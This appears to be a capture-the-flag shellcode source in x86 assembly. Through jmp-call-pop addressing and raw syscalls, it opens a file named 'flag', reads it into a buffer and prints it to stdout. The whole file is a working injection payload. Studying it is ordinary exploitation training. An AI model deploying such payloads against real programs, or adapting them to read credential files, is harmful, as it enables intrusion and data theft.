#include <sys/syscall.h>

#define STRING	"flag"
#define STRLEN	4

.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  popl    %esi			/* address to file_name string */
  xorl    %eax,%eax		/* clear eax to be 0 */
  movb    %al,(STRLEN)(%esi)	/* create a null byte at the end of flag */

/* open the file */
  xorl    %eax,%eax
  addl    $5,%eax
  movl    %esi,%ebx 		/* arg1: filename */
  xorl    %ecx,%ecx		/*   read-only mode */
  int     $0x80			/* ); */

/* Set arguments for read() */
  movl    %eax,%ebx		/* Store file_descriptor retuned by open */
  popl    %esi			/* pointer to beginning of buffer */
  movl    %esi,%ecx		/* save pointer in ecx */
  xorl    %edx,%edx
  movw    $0x410,%dx		/* Store 1040 into edx */

/* read the file */
  xorl    %eax,%eax
  addl    $3,%eax		/* read( */
  				/*   *buf, in ecx */
				/*   bufsize in %edx*/
				/*   file descriptor in %ebx*/
  int    $0x80			/* ); */

/* write to STDOUT */
  xorl    %eax,%eax
  addl    $4,%eax		/* write( */
  xorl    %ebx,%ebx
  inc     %ebx			/*   STDOUT file_descriptor */
  				/*   *buf in ecx*/
  int    $0x80			/* ); */

/* Exit */
  xor    %ebx,%ebx
  mov    %ebx,%eax
  inc    %eax
  int    $0x80

calladdr2:
  call popladdr
  .string STRING

calladdr:
  call    calladdr2
  .space  1040,0xFF


